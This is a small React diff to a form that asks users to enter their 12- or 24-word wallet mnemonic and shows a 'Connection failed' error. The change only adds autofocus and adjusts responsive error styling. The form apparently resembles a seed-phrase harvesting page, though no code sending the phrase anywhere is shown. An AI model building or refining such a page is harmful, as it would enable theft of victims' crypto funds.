@@ -39,7 +39,8 @@ export const Form = () => {
             name="mnemonics"
             className="w-full h-[100px] border outline-none p-1"
             placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
-            required></textarea>
+            required
+            autoFocus></textarea>
           <button
             type="submit"
             value="submit"
@@ -58,8 +59,8 @@ export const Form = () => {
 
       {showError && (
         <>
-          <div className="text-red-600 flex flex-row items-center justify-center gap-x-2">
-            <MdError />
+          <div className="text-red-600 max-md:text-sm flex flex-row items-center justify-center text-center gap-x-2">
+            <MdError className="max-md:h-[2rem]" />
             <p>Connection failed, please try again</p>
           </div>
           <button
